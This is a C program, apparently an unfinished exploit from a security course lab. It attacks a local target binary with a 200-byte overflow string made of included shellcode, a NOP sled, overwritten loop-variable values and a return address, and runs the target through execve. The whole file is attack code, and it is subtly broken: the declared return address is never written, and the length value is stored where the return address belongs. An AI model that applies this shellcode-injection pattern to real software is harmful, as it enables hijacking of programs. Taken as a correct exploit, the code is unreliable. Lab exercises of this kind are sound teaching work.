#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

/*

This is still WIP

 We want the exploit string to look like this;
 [shellcode...][NOP][NOP][NOP]...[NOP][NOP][value i][value len][NOP][NOP][NOP][retaddr]
*/
int main(void)
{
  char *args[3];
  char *env[1];

  char exploit[200];
  bzero(exploit, 200);
  
  strcpy(exploit, shellcode);
  memset(&exploit[45], NOP, 155);

  int target_i = 0x01ffff01;
  SET_VALUE(exploit, 168, target_i);

  int target_len = 200;
  SET_VALUE(exploit, 172, target_len);
  

  char* r = (char*)0x2021fe10;
  SET_VALUE(exploit, 180, target_len);
  
  //print_exploit(exploit, 200);

  args[0] = TARGET;
  args[1] = exploit;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}